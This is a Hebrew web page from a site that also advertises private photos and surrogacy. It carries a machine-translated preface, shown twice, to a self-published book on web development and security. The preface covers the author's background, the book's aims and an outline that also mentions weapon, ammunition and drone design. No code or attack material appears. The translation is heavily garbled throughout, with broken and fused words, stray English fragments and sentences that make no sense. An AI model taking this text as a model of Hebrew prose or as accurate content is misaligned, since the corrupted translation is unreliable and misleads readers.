<!doctype html> <html lang="he">


  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="בידור מקצועי, תמונות, סרטונים, אודיו, סטרימינג בשידור חי ומשחק מזדמן, כמו גם סריקת תעודות זהות, פיתוח אתרים ושירותי פונדקאות.">
    <meta name="author" content="Charlotte Grace Harper">
    <link rel="icon" href="/media/favicon.ico">
    <title>למידה עמוקה מבוססת אינטרנט ואבטחה לפי דוגמה - Glam Girl X</title>
    <link rel="canonical" href="https://glamgirlx.com/he/practical-web-based-deep-learning-and">
    <link href="/static/main.css" rel="stylesheet">
    <link rel="manifest" href="/site.webmanifest">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
    <link rel="stylesheet" href="/static/fonts/bootstrap-icons.css">
    
<meta property="og:image" content="/media/static/default.png">
<meta name="pinterest:image" content="/media/static/default.png"/>

    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8062317950995248"
         crossorigin="anonymous"></script>
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-XG1SZ2K8S5"></script>
	<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());
	
	  gtag('config', 'G-XG1SZ2K8S5');
	</script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16692395808">
    </script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'AW-16692395808');
    </script>
  </head>
  <body>
    <header>
      
      
      <nav id="glam-navbar" class="navbar fixed-top navbar-expand-lg navbar-light p-2" style="background-color: #e3f2fd;">
        <a style="position: relative; z-index: 1;" class="navbar-brand" href="/he/" title="דף הבית">
	        <img src="/media/lips.png" alt="הלוגו - Glam Girl X" width="30" height="30" style="border-radius: 50%; background-color: transparent;">
	    	Glam Girl X
    	</a>
        <button class="navbar-toggler ms-auto" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" data-bs-auto-close="true" data-bs-toggle="dropdown" aria-controls="navbarScroll" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        
        
        <div class="collapse navbar-collapse " id="navbarSupportedContent">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item">
              <a class="nav-link" href="/he/news" title="מאמרים חדשים">חֲדָשׁוֹת</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/he/contact" title="צור איתי קשר">מַגָע</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/he/landing" title="בקר בדף הנחיתה">נְחִיתָה</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/he/chat" title="וידאו צ&#x27;אט">לְשׂוֹחֵחַ</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/he/private" title="ראה תמונות פרטיות עם מפתח">פְּרָטִי</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="https://lotteh.com/payments/surrogacy/Daisy/?lang=he" title="Surrogacy plans">פונדקאות</a>
            </li>
          </ul>
          <ul class="navbar-nav" style="margin-left: auto;">
            <form class="form-inline d-flex mt-2 mt-md-0" action="https://lotteh.com/search/" method="GET">
              <input class="form-control hide" type="text" id="lang" name="lang" value="he">
              <input class="form-control mr-sm-2" type="text" id="q" name="q" placeholder="לְחַפֵּשׂ" aria-label="לְחַפֵּשׂ" required>
              <button class="btn btn-outline-success my-2 my-sm-0" type="submit" title="חפש באתר שלי, lotteh.com">לְחַפֵּשׂ</button>
            </form>
            <li class="nav-item">
              <a class="nav-link disabled" href="#" title="תמיד בחינם - צור חשבון כדי לתמוך בי">לְשַׁחְרֵר</a>
            </li>
            <li class="nav-item align-middle">
              <small><i><a class="text-dark nav-link" style="vertical-align: middle;" id="current-time">

--- ---
</a></i></small>

            </li>
            <li class="nav-item align-middle">
              <small><i><a class="text-dark nav-link" style="vertical-align: middle;" id="current-time-text">


</a></i></small>

            </li>
            <li class="nav-item">
	          <a href="https://lotteh.com/landing/" title="בקר בדף הנחיתה">
                <div class="dynamicClockContainer" id="dynamicClockContainer" style="background-color: #ffcccb;">
        <div class="dhour" id="hour"></div> 
        <div class="dminute" id="minute"></div> 
        <div class="dsecond" id="second"></div> 
</div> 

              </a>
            </li>
          </ul>
        </div>
      </nav>
    </header>
    
    <main role="main" class="container">
        
	    <div style="height: 100px;"></div>
        
	    


<h1>למידה עמוקה מבוססת אינטרנט ואבטחה לפי דוגמה</h1>
<img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisyתמונת הפרופיל" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
<p><i>עַל יְדֵי Daisy</i></p>

<div style="white-space: pre-wrap;">מעשי מבוסס על למידה עמוקה ואבטחה על ידי דוגמה
מהדורה שלישית
שרלוט הרפר
3 ביולי 2024

הַקדָמָה:

שיקולי אבטחה בבניית תוכנות לרשת הם חלק חשוב בתוכנית וביצוע של מפתח אינטרנט כלשהו תוך הנדסת אב -טיפוס שהוא אמין, יציב ושימושי למטרות מעשיות. ה- DOM (סימון אובייקטים של מסמך), עם יישום ה- HTML, JavaScript ו- CSS וכן תוכנת Backend המיישמת את פייתון, C/C ++, Java ו- Bash, נותנים למפתחי אתרים את החופש והכוח כדי ליצור מגוון רחב של פרויקטים המבטאים את היצירתיות, מספקים קלות של שימוש ופונקציונליות, מתארות את האופי והאופי, ומוצגים את המראות, במראה נוי, המראה, כדי להרוג זמן או לבצע משהו באינטרנט, בדרך כלל במכשיר סמארטפון למסך מגע. רוב האנשים אפילו לא היו יודעים מאיפה להתחיל מתי הם רוצים לבנות אתר מאפס, הםנוטה להתחיל באתר של אדם אחר ולבנות משהו מוגבל בפונקציונליות, אמינות, קלות שימוש ובעיקר יצירתיות כאשר הם יכלו לקבל את כל הכלים החזקים האחרונים העומדים לרשותם על מנת לבנות משהו שימושי מבלי לבזבז זמן לחיצה על כפתורים, ובמיוחד לבזבז כסף לשלם עבור מנויים יקרים לתוכנה שמעטים רצו להשתמש בהם בכל מקרה בהתחשב במגבלותיו בנוחות השימוש והגמישות. אם יש לך כמה דקות לקרוא את הספר הזה וללמוד מה אני רוצה ללמד אותך, או אפילו לדבר איתי באופן אישי על המטרות שלך ולקבל הדרכה בכיוון הנכון, ואתה מוטיבציה ללמוד לקוד ולכתוב תוכנה משלך, לקחת את הספר הזה הביתה ולהקדיש זמן מה כדי ללמוד לבנות את הצרכים המשפיעים, החזקים, היעילים והחשובים, אתר אינטרנט שהוא הכל עלייך וכן בדיוק את הצרכים שלך.

עלי:
אני מפתח תוכנה עם מגוון רחבF ניסיון ב- C/C ++, Java, Python, HTML, CSS ו- JavaScript. אני בונה אתרים שאנשים רוצים להשתמש בהם, רוצים לבקר ואפילו להתמכר לשימוש רק כדי ללמוד, לשחזר זמן ולהרוג, והכי חשוב, אני מוכר תוכנה. אם היה לך רעיון בדיוק איך רצית שאתר יחפש ויתפקד, היית מוכן לתמוך בי כדי שאוכל לענות על הצרכים שלי בזמן שאני פוגש את שלך, ואתה מוכן לכסות את העלויות של הפעלת אתר בעצמך, הייתי בונה לך את יוטיוב הבא, Tiktok, Twitter, Google או אפילו אפליקציית האבטחה היי-טק רק שתוכל לגשת אליו. במקום לנסות למכור לך את זמני, אני מנסה לקנות את שלך: אני רוצה לדבר אותך בבניית אפליקציה (אתר) בעצמך עם המידע שכבר קיים, וללמד אותך את מה שאתה צריך כדי להיות מפתח תוכנה עצמאי, יזם, המוביל קריירה מצליחה בכל תחום שאתה רוצה. ותן לי להיות ברור, החינוך שאני נותן לך יהיה לא פורמלי. אתה יכול ללכת לבית הספר וללמוד את כל זה עם רשמיDucation, או אפילו קרא את הספר הזה בבית הספר, השלם את המשימות שלך וקח הרבה מהשכלה שלך, אבל אני לא אשים אותך רשמית למושב החם ואבקש ממך להשלים מטלות. אני לא הפרופסור שלך, אתה יכול לחשוב עלי כמו חבר שרוצה להדריך אותך לקריירה המונעת על ידי ההצלחה האישית שלך. ואני גם לא מוכר לך הצלחה, תצטרך לקנות את זה עם הזמן שלך. למידה לקוד יש עקומת למידה תלולה ולעולם לא הייתה קלה, או אפילו אמורה להיות. אתה צריך לעבוד קשה ככל שתוכל ולהמשיך לנסות ולהיכשל ולנסות שוב גם כשאתה מתוסכל כדי ללמוד ולבנות אפליקציות בעצמך. זה באופי הקוד עצמו. הקוד מנוהל על ידי מהדר שנועד למסור את הודעות השגיאה של המתכנת, ואלה ילמדו אותך כיצד לקוד, גם אם אתה פשוט מעתיק את השגיאה במנוע החיפוש שלך וקורא דוגמאות של אנשים אחרים. ואני חייב לומר, אתה לא צריך להיות עשיר במיוחד, חכם, מצליח אופרט מכוון או מאורגן לבניית אפליקציה. המחשב דואג לארגון זה עבורך. אתה רק צריך להתמיד דרך הניסוי והטעייה, לשמור על מיקוד ולעבוד קשה במה שאתה עושה, ותהיה לך קריירה מצליחה מאוד בכל מה שאתה עושה.

מי אני:
אני מבין שהקטע האחרון היה יותר על למידה ולקחת דרכים מהספר הזה. מי אני בדיוק? זו שאלה מסובכת. אני לא ברור על עצמי בעצמי, מכיוון שאני סובל ממצבים רפואיים שיכולים להקשות עלי אפילו לקוד או לכתוב את הספר הזה לפעמים, תוך הצגת אתגרים עם סוגיות סוציאליזציה וזהות שמקשות על חיי כשמדובר בהצגת עצמי. בקיצור, אם אתה קורא את הספר הזה, הבאת אותו הביתה מכיוון שהפכת דרכו וחשבת שהוא שימושי, או אפילו אם אתה פשוט קורא את זה רחוק, לך אני אינדיבידואלי כמו אופק שרוצה לראות אותך מצליח בכל מה שאתה עושה. אני מהנדס בעצמי, תוכנהאלופר, וסטודנט, ואני כותב את הספר הזה לתלמידים אחרים שרוצים להקל על חייהם על ידי שיש לי ספר לימוד של התוכנה שהם צריכים להקל על חייהם על ידי מתן דוגמאות להעתיק המתאימות יחד כמו פאזל גדול לאפליקציה עובדת, שימושית, גדולה, פונקציונלית, מגובשת ומרתקת שיכולה להניע את ההצלחה ללא קשר לעסקים. בעיקר, זה מה שאני עושה: אני בונה אפליקציות שיעזרו לעצמי ולאנשים אחרים להצליח. אני גם מחבר, אם כי זה הפרסום הראשון שלי שאני מתכוון להשלים כדי להרכיב את תיק העבודות שלי למסמך שימושי, וגם אני אמן.
אני אודה לך בזה, אני סוג של אדם מוזר. אני לא מושלם, ניהלתי תוספות עם החוק אפילו להוביל אותי לעזוב את המכללות והאוניברסיטאות ולעזוב מדינות כדי לנסות לעשות לעצמי שם עם יותר הצלחה. אני אישה מלידה, אני לובשת איפור, מצלמת את עצמי, לובשת שמלות ובגדי נשים אחרות, ואני נשארת מודעת לעצמי כנקבהאטור. היו לי בעיות עם אנשים אחרים בעבר שמובילים למאבקים בכתיבה ובניית WebApps, ואני מתנצל שלא הצלחתי להכניס את הספר הזה לידיים מוקדם יותר: היית צריך את זה. אתה תרצה לקרוא ולכתוב קוד שנראה כמו שלי ועובד כמו שלי ועושה את אותו הדבר אבל אפילו טוב יותר, כי אם אתה יכול להרשות לעצמך לקנות את הספר הזה במקום לרסק את המקלדת שלך כמו שאני עושה רק כדי ליצור ספר בעצמך מבקש כסף עבורו, יש לך את המשאבים שאתה צריך כדי להצליח בחיים שלך. היו לי כל מיני בעיות עם משפחת התבגרות, מצבי בריאות, רופאים, התקשורת והחוק, והקוד שלי משקף עמוקות את המאבק שהוא פמיניזם ואופי נשי בעולם מחולק ומתוסכל. עם זאת, הספר הזה הוא משהו שאכפת לי מאוד ממנו, התינוק שלי, התיק שלי והפרנסתי שלי, כך שאני מעריך את שיקולך כשאתה לוקח את הטקסט הביתה ומנחב אותו בזהירות כדי ללמוד ממני. אנא זכור שאני לא מושלם, זהל- OOK יהיו שגיאות, תיקונים ומהדורות חדשות, ותצטרך לחשוב עם המוח ההגיוני שלך כמיטב יכולתך כדי לקבל חוויה מוצלחת בכתיבה שלי. כמו כן, הבין שאני מתכוון טוב לך גם כשאתה מתמודד עם אתגרים בעת הכתיבה. חשבו על זה ככה: כשאתה יכול פשוט לשכור מערכת מחשבים שתעשה כל דבר שאתה יכול לדמיין במרחב הדיגיטלי, לאחסן את כל המידע שאתה נתקל בו, #$%! יזה וארגן אותו, ותבין אותו, בהכרח תיתקל בקשיים עם המידע שאתה בולע ואפילו לפרסם. אני אומר לך את זה כי אני נתקל באותם קשיים. השתמש בספר זה על אחריותך בלבד, עבד עם הקהילה שלך וקהילות העומדות לרשותך לבניית תוכנה במסגרת בטוחה, ואל תקח דברים באופן אישי כשאתה נכשל או אפילו מצליח בצורה לא נכונה: ככה הגעתי עד כה, ומדוע אוכל להביא לך את הטקסט הזה ולעזור לך להצליח בלי להתנתק בדרך של טירוף שעוזבשופע, קרוע ונקרא בזמן שאני נתקל בבעיות הרגילות שכולם עושים בקנה מידה עולמי בזכות הסולם הגלובלי הפרליסטי של הרשת שעליה נעבוד, האינטרנט. יתכן שאתה לא מכיר את מי שאני רק עם כמה מילים, אבל אני ממליץ לך לקרוא, תכיר אותי כשאתה ממשיך לקרוא ולהבין אותי תוך כדי בניית פרויקטים משלך להשלמת העבודה שלך. לא יהיו שיעורי בית עם הספר הזה, כל עוד הפרופסורים או המורים שלך לא מקצים לך שום דבר, אבל אני ממליץ לך מאוד לבנות עבודת פורטפוליו בעצמך כשאתה קורא, כמו גם פרויקט Capstone המציג כיצד אתה יכול ליישם את מה שלמדת. פרויקט Capstone שלי הוא הבסיס לרוב מה שתקראו בספר זה, מכיוון שהוא משלב קוד מהפרויקטים הקודמים שלי, קוד שיצרתי ולמדתי לכתוב בשיטתיות ביד, ומגוון רחב של רעיונות וטיפים שעזרו לי להצליח עד כדי כך שאוכל לסובב אפליקציה פשוטה שהיא מלאהסומכת ונראית ומתנהגת כמו אפליקציה פופולרית שאולי תראה את חברך או המשפחה שלך משתמשים באינטרנט, המפורסמת לך או בחדשות.

מהו הספר הזה:
ספר זה הוא הדרכה לפי דוגמה. אתה יכול למצוא קוד כאן, הוראות כיצד ללמוד לקוד, מידע על ניפוי באגים ותיקון שגיאות, פתרון בעיות שלבים, הוראות כיצד לגבות ולשמור את הקוד שלך, לפרוס מחדש אם מישהו ישבור את הקוד שלך, לאבטח את הקוד שלך, לפרוס את הקוד שלך, לבנות את האתרים והאיש שלך, וכן את האפליקציה שלך, וכן את ההתחשבנות שלך, וכן את זה, מדובר, זה, מדוע זה, מדובר, תוכנה שאתה בונה את האור הטוב ביותר המוחלט להיות האטרקטיבי ביותר ככל האפשר למשתמשי הקצה שלך, המבקרים באתר שלך. בספר זה, אדגים מספר דוגמאות לעיצוב תוכנה עם דגש על האינטרנט כפלטפורמה כמו גם אבטחה. אנו נתחיל את חווית הלמידה על ידי בניית פרויקט בסיסיING של מעטפת UNIX, עם תכונות גיבוי ותסריטים. לאחר מכן, אנו נבחן אתר בבלוג בסיסי, נשדרג את הבלוג שלנו עם תכונות תמונות ווידאו וכן נשתמש בתכונות אלה כדי להשתמש בפתרונות אבטחה באמצעות תוכנה חופשית ונאבטח את השרת שלנו באמצעות מודול אימות ניתן לחיבור (PAM). לאחר מכן נסקור את הטיפול והעיבוד של קבצים, בחינת עריכת וידיאו, תרומת קולי, סריקת ברקוד וזיהוי תווים אופטי, בין מושגים אחרים. לאורך הדרך נבחן ממשקי API אשר יעזרו לנו להפוך את התוכנה שלנו למועילה ובטוחה יותר, עם אפשרויות בחינם ומשולמות. לאורך הדרך, נחקור אבטחה פיזית וכלים מיליטנטיים כמו כלי נשק ותחמושת תכנון וייצור כולל עיצוב חבית ומשחזר, עיצוב צריח ומזל"ט, ומנהלים אחרים שנשתלב עם התוכנה שלנו ברשת הקיימת על מנת להגן על התוכנה שלנו ולהפגין הגנה עצמית וחסידות. ניקח הפסקות לאורך הדרך לבניית משחקים, 2d ו- 3Dמנועי סיבוב ועבודה עם חומרה משובצת בדוגמאות למבחני מקרה לתוכנת עיבוד מימדית בסיסית ועיסוי רוטט אלקטרוני יצוק בגומי סיליקון בהתאמה. לאורך הדרך, אנו נשתמש גם בפתרונות למידת מכונות שכבר זמינים על מנת לאבטח טוב יותר את התוכנה שלנו. אנו גם נשתמש בכלי מניות הזמינים לאינטרנט על מנת לייעל את התהליך ולאבטח את התהליך. ספר זה מהווה מדריך להצלחתך בבניית יישום אינטרנט ושילובו ברשת מקצועית של מערכות מכונות מחשב ומטוס, ובסך הכל מדריך לבניית תוכנה וחומרה משובצת ללא ידע ברקע או ניסיון קודם. 

מה שהספר הזה אינו:
אם אתה באמת רוצה שיהיה לך אתר, אתה יכול פשוט להקים חנות פשוטה ולמכור את מה שאתה צריך, לפרסם בלוג, לפרסם תמונות או סרטונים, או אחרת מבלי לכתוב אי פעם שורת קוד אחת. הספר הזה הוא לא זה. ספר זה ילמד אותך כיצד לבנות תוכנה שימושית יותר, באופן מלא, פונקציונלי ומאובטח מכל תוכנה שכבר תוכל למצוא, מכיוון שהיא מפרסת את התוכנה העדכנית ביותר שעדיין אבות -טיפוס, עשויה להיות יקרה להפעלה בקנה מידה של חברות ישנות פועלות בהן ואינן מושכות לאחור, חברות מפותלות שהוקמו כדי להרוויח כסף לאנשים שלא באמת עושים דבר. אם תעקוב אחר ספר זה מקרוב, תרצה לכתוב קוד, קוד מחקר, לבנות אפליקציות משלך ותרוויח כסף ממה שאתה עושה. אני ארוויח כסף מהספר הזה, אפילו בשלבים מוקדמים, מכיוון שהוא מכיל מידע שאנשים צריכים ורוצים לקרוא, וכבר קונים כשהם קונים או משתמשים באפליקציות שלי. ספר זה לא יבנה עבורך אפליקציה, אך הוא יפנה אותך בכיוון הנכון ויחמש אותך עם הכלים הדרושים לך ואת הכישורים והטיפים שיאפשרו את ההצלחה שלך בבניית תוכנה לאינטרנט, עם כל שורת קוד שתצטרך לכתוב כדוגמה, מוכנה להיות מחוברת לתוכנה שאתה ולתומכים שלך, אורחים, קהל לקוחות, חברים,חממה, מבקרים, קבלנים ואנשי האינטרנט רוצים להשתמש ולתמוך.

מה תלמד:
ספר זה ילמד אותך כיצד לבנות ולמכור תוכנה, תוכנה פונקציונאלית, שימושית באמת, הקלטת מדיה, מאפייני אבטחה כמו זיהוי פנים, סריקת ברקוד באזור קריאה של מכונה, ממשקי API לאינטרנט כדי לאמת, להקליט ולהעביר וידאו ותמונות, ולהחליף הודעות כמו Bluetooth ו- Near Field (NFC). ספר זה ילמד אותך כיצד להשתמש במחשב ברשת, תוך...</div>



<div id="reader-modal105" class="hide" style="position: fixed; left: 0; top: 0; width: 100%; height: 110%; z-index: 900; background-color: #fdfeff; overflow: scroll;">
<div style="position: relative;">
<div id="readertext105" style="width: 100%; height: 80%; overflow: scroll;" class="p-2">
<div style="height: 15%; width: 100%;"></div>
<legend class="article-content mt-5 pt-3">למידה עמוקה מבוססת אינטרנט ואבטחה לפי דוגמה</legend>
<p class="article-content mb-5 pb-5">
מעשי מבוסס על למידה עמוקה ואבטחה על ידי דוגמה
מהדורה שלישית
שרלוט הרפר
3 ביולי 2024

הַקדָמָה:

שיקולי אבטחה בבניית תוכנות לרשת הם חלק חשוב בתוכנית וביצוע של מפתח אינטרנט כלשהו תוך הנדסת אב -טיפוס שהוא אמין, יציב ושימושי למטרות מעשיות. ה- DOM (סימון אובייקט מסמך), עם יישום ה- HTML, JavaScript ו- CSS וכן תוכנת Backend המיישמת את Python, C/C ++, Java ו- Bash, נותנים למפתחי אתרים את החופש והעוצמה ליצור מגוון רחב של פרויקטים המבטאים יצירתיות, לספק קלות שימוש ופונקציונליות, מציגים ענווה ואופי, ולספק קלות שימוש כמו גם נוחות ושירותים חשובים שכולם אטרקטיביים לג'ו הממוצע, משתמש הקצה שמחפש להרוג זמן או לעשות משהו באינטרנט, בדרך כלל במכשיר סמארטפון מסך מגע. רוב האנשים אפילו לא היו יודעים מאיפה להתחיל מתי הם רוצים לבנות אתר אינטרנטמגרד, הם היו נוטים להתחיל באתר של אדם אחר ולבנות משהו מוגבל בפונקציונליות, אמינות, קלות שימוש ובעיקר יצירתיות כאשר הם יכלו לעמוד על כל הכלים החזקים האחרונים העומדים לרשותם על מנת לבנות משהו שימושי בלי לבזבז זמן לחיצה על כפתורים ובמיוחד בזבוז כסף שמשלם עבור מנויים יקרים לתוכנה שמעטים אנשים רצו להשתמש בהם בכל מקרה בהתחשב במגבלותיו בנוחות השימוש והגמישות. אם יש לך כמה דקות לקרוא את הספר הזה וללמוד מה אני רוצה ללמד אותך, או אפילו לדבר איתי באופן אישי על המטרות שלך ולקבל הדרכה בכיוון הנכון, ומונעים ללמוד לקוד ולכתוב תוכנה משלך , קח את הספר הזה הביתה והקצה קצת זמן ללמוד לבנות את יישום האינטרנט המשפיע, העוצמתי, היעיל והחשוב הבא, אתר שכולך עליך ועושה בדיוק את מה שאתה רוצה ועונה על צרכי הקהל שלך.

עלי:
אני מפתח תוכנה עםמגוון הניסיון ב- C/C ++, Java, Python, HTML, CSS ו- JavaScript. אני בונה אתרים שאנשים רוצים להשתמש בהם, רוצים לבקר ואפילו להתמכר לשימוש רק כדי ללמוד, לשחזר זמן ולהרוג, והכי חשוב, אני מוכר תוכנה. אם היה לך רעיון בדיוק איך רצית שאתר יחפש ויתפקד, היית מוכן לתמוך בי כדי שאוכל לענות על הצרכים שלי בזמן שאני עומד בשלך, ואתה מוכן לכסות את העלויות של הפעלת אתר בעצמך, הייתי בונה לך את ה- YouTube, Tiktok, Twitter, Google או אפילו אפליקציית אבטחה היי-טק רק שתוכל לגשת אליה. במקום לנסות למכור לך את הזמן שלי, אני מנסה לקנות את שלך: אני רוצה לדבר אותך בבניית אפליקציה (אתר) בעצמך עם המידע שכבר קיים, וללמד אותך את מה שאתה צריך כדי להיות מפתח תוכנה עצמאי, יזם, מוביל קריירה מצליחה בכל תחום שתרצו. ותן לי להיות ברור, החינוך שאני נותן לך יהיה לא פורמלי. אתה יכול ללכת לבית הספר וללמוד את כל זה עם אחינוך רשמי, או אפילו קרא את הספר הזה בבית הספר, מלא את המטלות שלך, ולקחת הרבה מהשכלה שלך, אבל אני לא אשים אותך רשמית למושב החם ואבקש ממך למלא משימות. אני לא הפרופסור שלך, אתה יכול לחשוב עלי כמו חבר שרוצה להדריך אותך לקריירה המונעת על ידי ההצלחה האישית שלך. ואני גם לא מוכר לך הצלחה, תצטרך לקנות את זה עם הזמן שלך. למידה לקוד יש עקומת למידה תלולה ולעולם לא הייתה קלה, או אפילו אמורה להיות. אתה צריך לעבוד קשה ככל שתוכל ולהמשיך לנסות ולהיכשל ולנסות שוב גם כשאתה מתוסכל כדי ללמוד ולבנות אפליקציות בעצמך. זה באופי הקוד עצמו. הקוד מנוהל על ידי מהדר שנועד למסור את הודעות השגיאה של המתכנת, ואלה ילמדו אותך כיצד לקוד, גם אם אתה פשוט מעתיק את השגיאה במנוע החיפוש שלך וקורא דוגמאות של אנשים אחרים. ואני חייב לומר, אתה לא צריך להיות עשיר במיוחד, חכם,Essful, או אפילו פרטים מכוונים או מאורגנים לבניית אפליקציה. המחשב דואג לארגון זה עבורך. אתה רק צריך להתמיד דרך הניסוי והטעייה, לשמור על מיקוד ולעבוד קשה במה שאתה עושה, ותהיה לך קריירה מצליחה מאוד בכל מה שאתה עושה.

מי אני:
אני מבין שהקטע האחרון היה יותר על למידה ולקחת דרכים מהספר הזה. מי אני בדיוק? זו שאלה מסובכת. אני לא ברור על עצמי, מכיוון שאני סובל ממצבים רפואיים שיכולים להקשות עלי אפילו לקוד או לכתוב את הספר הזה לפעמים, תוך הצגת אתגרים עם סוגיות סוציאליזציה וזהות שמקשות על חיי כשמדובר בהצגת עצמי ו בקיצור, אם אתה קורא את הספר הזה, הבאת אותו הביתה כי דפכת דרכו וחשבת שהוא שימושי, או אפילו אם אתה פשוט קורא את זה רחוק, לך אני אינדיביד כל מה שאתה עושה. אני מהנדס בעצמי,מפתח, וסטודנט, ואני כותב את הספר הזה לתלמידים אחרים שרוצים להקל על חייהם על ידי שיש לי ספר לימוד של התוכנה שהם צריכים להקל על חייהם על ידי מתן דוגמאות להעתקה המתאימות כמו פאזל גדול לעבודה , אפליקציה שימושית, גדולה, פונקציונלית, מגובשת ומרתקת שיכולה להניע הצלחה ללא קשר לקו העסקים. בעיקר, זה מה שאני עושה: אני בונה אפליקציות שיעזרו לעצמי ולאנשים אחרים להצליח. אני גם מחבר, אם כי זה הפרסום הראשון שלי שאני מתכוון להשלים כדי להרכיב את תיק העבודות שלי למסמך שימושי, וגם אני אמן.
אני אודה לך בזה, אני סוג של אדם מוזר. אני לא מושלם, ניהלתי תוספות עם החוק אפילו להוביל אותי לעזוב את המכללות והאוניברסיטאות ולעזוב מדינות כדי לנסות לעשות לעצמי שם עם יותר הצלחה. אני אישה מלידה, אני לובשת איפור, מצלמת את עצמי, לובשת שמלות ובגדי נשים אחרות, ואני נשארת מודעת לעצמי כ-נקבה מטבעם. היו לי בעיות עם אנשים אחרים בעבר שמובילים למאבקים בכתיבה ובניית WebApps, ואני מתנצל שלא הצלחתי להכניס את הספר הזה לידיים מוקדם יותר: היית זקוק לזה. אתה תרצה לקרוא ולכתוב קוד שנראה כמו שלי ועובד כמו שלי ועושה את אותו הדבר אבל אפילו טוב יותר, כי אם אתה יכול להרשות לעצמך לקנות את הספר הזה במקום לרסק את המקלדת שלך כמו שאני עושה רק כדי ליצור ספר בעצמך מבקש כסף בשביל זה יש לך את המשאבים שאתה צריך כדי להצליח בחיים שלך. היו לי כל מיני בעיות עם משפחת התבגרות, מצבי בריאות, רופאים, התקשורת והחוק, והקוד שלי משקף עמוקות את המאבק שהוא פמיניזם ואופי נשי בעולם מחולק ומתוסכל. עם זאת, הספר הזה הוא משהו שאכפת לי מאוד ממנו, התינוק שלי, התיק שלי והפרנסה שלי, אז אני מעריך את שיקולך כשאתה לוקח את הטקסט הביתה ומטפל בו בזהירות כדי ללמוד ממני. אנא זכור שאני לאECT, לספר זה יהיו שגיאות, תיקונים ומהדורות חדשות, ותצטרך לחשוב עם המוח ההגיוני שלך כמיטב יכולתך כדי לקבל חוויה מוצלחת בכתיבה שלי. כמו כן, הבין שאני מתכוון טוב לך גם כשאתה מתמודד עם אתגרים בעת הכתיבה. חשבו על זה ככה: כשאתה יכול פשוט לשכור מערכת מחשב שתעשה כל דבר שאתה יכול לדמיין במרחב הדיגיטלי, לאחסן את כל המידע שאתה נתקל בו, #$%! יזה וארגן אותו, ובוא להבין אותו, אתה תעשה זאת באופן בלתי נמנע נתקלים בקשיים במידע שאתה בולע ואפילו לפרסם. אני אומר לך את זה כי אני נתקל באותם קשיים. השתמש בספר זה על אחריותך בלבד, עבד עם הקהילה שלך וקהילות העומדות לרשותך לבניית תוכנה במסגרת בטוחה, ואל תיקח דברים באופן אישי כשאתה נכשל או אפילו מצליח בצורה לא נכונה: ככה הגעתי עד כה ומדוע אוכל להביא לך את הטקסט הזה ולעזור לך להצליח מבלי להתפוגג בדרך של טירוףAves Me Me הרוס, קרוע ונפרד בזמן שאני נתקל בבעיות הרגילות שכולם עושים בקנה מידה עולמי בזכות הסולם הגלובלי הפרליסטי של הרשת שעליה נעבוד, האינטרנט. יתכן שאתה לא מכיר את מי שאני רק עם כמה מילים, אבל אני ממליץ לך לקרוא, תכיר אותי כשאתה ממשיך לקרוא ולהבין אותי תוך כדי בניית פרויקטים משלך להשלמת העבודה שלך. לא יהיו שיעורי בית עם הספר הזה, כל עוד הפרופסורים או המורים שלך לא מקצים לך שום דבר, אבל אני ממליץ לך מאוד לבנות עבודת פרויקטים בעצמך בזמן שאתה קורא, כמו גם פרויקט קפסטון המציג איך אתה יכול החל את מה שלמדת. פרויקט Capstone שלי הוא הבסיס לרוב מה שתקראו בספר זה, מכיוון שהוא משלב קוד מהפרויקטים הקודמים שלי, הקוד שיצרתי ולמדתי לכתוב בשיטתיות ביד, ומגוון רחב של רעיונות וטיפים שעזרו לי להצליח עד כדי כך שאוכל לסובב אפליקציה פשוטהמוצג במלואו ונראה ומתנהג כמו אפליקציה פופולרית שאתה עשוי לראות את חברך או המשפחה שלך משתמשים, באינטרנט, המפורסמים לך או בחדשות.

מהו הספר הזה:
ספר זה הוא הדרכה לפי דוגמה. אתה יכול למצוא קוד כאן, הוראות כיצד ללמוד לקוד, מידע על קוד ניפוי באגים ותיקון שגיאות, פתרון בעיות, הוראות כיצד לגבות ולשמור את הקוד שלך, לפרוס מחדש אם מישהו מפרק את הקוד שלך, אבטח את הקוד שלך, לפרוס הקוד שלך, בנה אתרים אינטראקטיביים שהם מבדרים, מרתקים וממכרים, ותקבל תחושה של מי שאני, מדוע זה חשוב ואיך להציג את עצמך, את האפליקציה שלך ותמונת החברה שלך, כמו גם את התוכנה שאתה בונה באור הטוב ביותר המוחלט להיות האטרקטיבי ביותר ככל האפשר למשתמשי הקצה שלך, המבקרים באתר שלך. בספר זה, אדגים מספר דוגמאות לעיצוב תוכנה עם דגש על האינטרנט כפלטפורמה כמו גם אבטחה. אנו נתחיל את חווית הלמידה על ידי בניית בסיסיOfer offer באמצעות מעטפת UNIX, עם תכונות גיבוי ותסריטים. לאחר מכן, אנו נבחן אתר בבלוג בסיסי, נשדרג את הבלוג שלנו עם תכונות תמונות ווידאו וכן נשתמש בתכונות אלה כדי להשתמש בפתרונות אבטחה באמצעות תוכנה בחינם, ונאבטח את השרת שלנו באמצעות מודול אימות ניתן לחיבור (PAM). לאחר מכן נסקור את הטיפול והעיבוד של קבצים, בחינת עריכת וידיאו, תרומת קולי, סריקת ברקוד וזיהוי תווים אופטי, בין מושגים אחרים. לאורך הדרך נבחן ממשקי API אשר יעזרו לנו להפוך את התוכנה שלנו למועילה ובטוחה יותר, עם אפשרויות 